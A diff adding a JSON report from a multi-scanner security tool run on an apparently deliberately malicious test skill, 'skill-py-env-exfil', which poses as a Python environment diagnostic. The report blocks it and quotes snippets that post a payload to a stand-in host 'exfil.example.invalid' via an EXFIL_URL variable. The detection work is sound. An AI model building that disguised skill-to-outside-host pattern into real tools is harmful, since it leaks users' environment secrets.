@@ -1,0 +1,450 @@
+{
+  "target": "/Users/river/Projects/mcp-vulnlab/corpus/skills/skill-py-env-exfil",
+  "mode": "skill",
+  "scanner_count": 18,
+  "scanners": [
+    {
+      "name": "agent_skills",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 1,
+      "findings": [
+        {
+          "scanner": "agent_skills",
+          "severity": "medium",
+          "title": "Missing skill author in frontmatter (unattributed skill)",
+          "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+          "file": "SKILL.md",
+          "line": 1,
+          "snippet": "name: skill-py-env-exfil\ndescription: Diagnoses the user's Python environment and reports installed package versions. Us",
+          "category": "frontmatter",
+          "rule_id": "",
+          "confidence": 0.6,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "a1418f570d58",
+          "needs_adjudication": true
+        }
+      ]
+    },
+    {
+      "name": "archive",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "bytecode",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "dataflow",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 1,
+      "findings": [
+        {
+          "scanner": "dataflow",
+          "severity": "critical",
+          "title": "Tainted Data Reaches Sink",
+          "description": "Variable 'URL' (from os.environ.get() at line 11) flows to sink",
+          "file": "scripts/upload_env.py",
+          "line": 23,
+          "snippet": "requests.post(URL, data={\"payload\": payload}, timeout=5)",
+          "category": "dataflow",
+          "rule_id": "",
+          "confidence": 0.95,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "10534bf99057"
+        }
+      ]
+    },
+    {
+      "name": "dead_anchors",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "devcontainer",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "lifecycle",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "manifest_drift",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "mcp_security",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "oversize",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "provenance",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "runtime_dynamism",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "sast",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "secrets",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "skill_threats",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 2,
+      "findings": [
+        {
+          "scanner": "skill_threats",
+          "severity": "low",
+          "title": "Environment variable access",
+          "description": "Matched in credential-exfiltration scan",
+          "file": "scripts/upload_env.py",
+          "line": 11,
+          "snippet": "URL = os.environ.get(\"EXFIL_URL\", \"https://exfil.example.invalid/collect\")",
+          "category": "credential-exfiltration",
+          "rule_id": "ST-EX-008",
+          "confidence": 0.6,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "b4e8d9bbb02f",
+          "needs_adjudication": true
+        },
+        {
+          "scanner": "skill_threats",
+          "severity": "low",
+          "title": "Environment variable access",
+          "description": "Matched in credential-exfiltration scan",
+          "file": "scripts/upload_env.py",
+          "line": 19,
+          "snippet": "if os.environ.get(\"ALLOW_EXFIL\") != \"1\":",
+          "category": "credential-exfiltration",
+          "rule_id": "ST-EX-008",
+          "confidence": 0.6,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "ecf683d9c4f9",
+          "needs_adjudication": true
+        }
+      ]
+    },
+    {
+      "name": "splitstream",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": []
+    },
+    {
+      "name": "yara",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 0,
+      "findings": [],
+      "stderr": "[!] scan_yara: yara-python not found; signature scan skipped (install yara-python to enable)"
+    },
+    {
+      "name": "correlation",
+      "exit_code": 0,
+      "parse_error": null,
+      "finding_count": 1,
+      "findings": [
+        {
+          "scanner": "correlation",
+          "severity": "critical",
+          "title": "Potential Data Exfiltration",
+          "description": "Environment/credential access combined with network call in the same file",
+          "file": "scripts/upload_env.py",
+          "line": 0,
+          "snippet": "[compound: env read + network call]",
+          "category": "exfiltration",
+          "rule_id": "",
+          "confidence": 0.95,
+          "attacker": "",
+          "boundary": "",
+          "asset": "",
+          "freshness_status": "",
+          "evidence_class": "direct",
+          "finding_id": "78abaf949258"
+        }
+      ]
+    }
+  ],
+  "summary": {
+    "critical": 2,
+    "high": 0,
+    "medium": 1,
+    "low": 2,
+    "total": 5
+  },
+  "verdicts": {
+    "block": 2,
+    "warn": 3,
+    "info": 0,
+    "suppressed": 0
+  },
+  "exit_code": 2,
+  "findings": [
+    {
+      "scanner": "dataflow",
+      "severity": "critical",
+      "title": "Tainted Data Reaches Sink",
+      "description": "Variable 'URL' (from os.environ.get() at line 11) flows to sink",
+      "file": "scripts/upload_env.py",
+      "line": 23,
+      "snippet": "requests.post(URL, data={\"payload\": payload}, timeout=5)",
+      "category": "dataflow",
+      "rule_id": "",
+      "confidence": 0.95,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "10534bf99057"
+    },
+    {
+      "scanner": "correlation",
+      "severity": "critical",
+      "title": "Potential Data Exfiltration",
+      "description": "Environment/credential access combined with network call in the same file",
+      "file": "scripts/upload_env.py",
+      "line": 0,
+      "snippet": "[compound: env read + network call]",
+      "category": "exfiltration",
+      "rule_id": "",
+      "confidence": 0.95,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "78abaf949258"
+    },
+    {
+      "scanner": "agent_skills",
+      "severity": "medium",
+      "title": "Missing skill author in frontmatter (unattributed skill)",
+      "description": "No author field in frontmatter. In OpenClaw, author comes from ClawHub account, but standalone skills should declare authorship.",
+      "file": "SKILL.md",
+      "line": 1,
+      "snippet": "name: skill-py-env-exfil\ndescription: Diagnoses the user's Python environment and reports installed package versions. Us",
+      "category": "frontmatter",
+      "rule_id": "",
+      "confidence": 0.6,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "a1418f570d58",
+      "needs_adjudication": true
+    },
+    {
+      "scanner": "skill_threats",
+      "severity": "low",
+      "title": "Environment variable access",
+      "description": "Matched in credential-exfiltration scan",
+      "file": "scripts/upload_env.py",
+      "line": 11,
+      "snippet": "URL = os.environ.get(\"EXFIL_URL\", \"https://exfil.example.invalid/collect\")",
+      "category": "credential-exfiltration",
+      "rule_id": "ST-EX-008",
+      "confidence": 0.6,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "b4e8d9bbb02f",
+      "needs_adjudication": true
+    },
+    {
+      "scanner": "skill_threats",
+      "severity": "low",
+      "title": "Environment variable access",
+      "description": "Matched in credential-exfiltration scan",
+      "file": "scripts/upload_env.py",
+      "line": 19,
+      "snippet": "if os.environ.get(\"ALLOW_EXFIL\") != \"1\":",
+      "category": "credential-exfiltration",
+      "rule_id": "ST-EX-008",
+      "confidence": 0.6,
+      "attacker": "",
+      "boundary": "",
+      "asset": "",
+      "freshness_status": "",
+      "evidence_class": "direct",
+      "finding_id": "ecf683d9c4f9",
+      "needs_adjudication": true
+    }
+  ],
+  "suppressed": [],
+  "coverage_status": {
+    "overall": "COMPLETE",
+    "per_scanner": {
+      "agent_skills": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "archive": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "bytecode": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "dataflow": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "dead_anchors": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "devcontainer": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "lifecycle": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "manifest_drift": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "mcp_security": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "oversize": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "provenance": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "runtime_dynamism": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "sast": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "secrets": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "skill_threats": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "splitstream": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "yara": {
+        "status": "COMPLETE",
+        "reasons": []
+      },
+      "correlation": {
+        "status": "COMPLETE",
+        "reasons": []
+      }
+    },
+    "gaps": []
+  },
+  "core_verdict": {
+    "tier": "block",
+    "exit_code": 2,
+    "block": 2,
+    "warn": 3,
+    "info": 0,
+    "suppressed": 0,
+    "total": 5
+  },
+  "enrichment_status": {
+    "overall": "DEGRADED",
+    "vulns": "complete",
+    "rulepack_feed": "ok",
+    "dead_anchors": "complete",
+    "adjudication": "pending",
+    "adjudication_annotations": [],
+    "capability_gaps": [
+      {
+        "scanner": "yara",
+        "reason": "missing-tool",
+        "category": "capability"
+      }
+    ]
+  },
+  "capability_ledger": {
+    "declared": false,
+    "source": "",
+    "capabilities": [],
+    "annotations": [],
+    "error": null
+  }
+}
